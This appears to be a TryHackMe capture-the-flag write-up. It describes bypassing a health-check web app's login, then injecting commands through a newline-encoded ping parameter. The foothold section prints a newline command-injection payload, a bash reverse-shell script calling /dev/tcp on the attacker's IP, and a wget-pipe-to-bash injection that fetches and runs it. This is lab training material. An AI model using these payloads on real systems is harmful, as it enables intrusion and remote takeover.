One of many medium-difficulty THM challenges I have on my list. The CTF starts by finding a login-panel for a web-service that performs continuous health checks for machines inside of the internal victim's network. After getting in through SQLi, the dashboard shows suspicious logs, and we find that we can abuse a `ping` command by a URL-encoded newline character `%0a`. After gaining a foothold, we pivot laterally by using some plain-text credentials, and finally we escalate to root after cracking a keepass DB through insecure credentials.

The app has a functionality where we can ping machines in the network to get health checks, so the plan is to try and see whether we can reach back to our Kali box. Indeed, if we enter our `tun0` interface in the app and send the request, we can intercept the call with `tcpdump`:

## Foothold as www-data

So how do we turn this into RCE? The dashboard contained some suspicious logs, namely calls to `127.0.0.1%0awhoami`, which looks like an injected newline character. 

Intercepting a ping request to `127.0.0.1%0aid` in Burp, we see that it is URL-encoded again, i.e. the `POST` body reads `target=127.0.0.1%250aid`. Changing this back to `target=127.0.0.1%0aid` manually, we get RCE, as the following blocks from the HTML output show (first one is doubly URL-encoded, second one is manipulated):

```html
<pre class="output-pre">
    ping: 127.0.0.1%0aid: Name or service not known
</pre>

<pre class="output-pre">
  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms
  
  --- 127.0.0.1 ping statistics ---
  2 packets transmitted, 2 received, 0% packet loss, time 1030ms
  rtt min/avg/max/mdev = 0.029/0.030/0.032/0.001 ms
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

We have RCE! Now I dropped a reverse shell as follows:

1. Create `rev.sh` reverse shell script locally, simply containing:
  ```
  #!/bin/bash
  bash -i >& /dev/tcp/192.168.133.40/9001 0>&1
  ```
2. `chmod +x rev.sh`
3. Stand up a local web server: `python3 -m http.server`
4. Stand up a listener locally: `nc -lvnp 9001`
5. In the Burp Repeater, download the reverse shell and execute it (only `POST` body is shown here): `target=127.0.0.1%0awget 192.168.133.40:8000/rev.sh | bash`
6. In case pipes don't work, just send two seperate requests

After executing step 5, I caught and stabilized the shell as `www-data`.
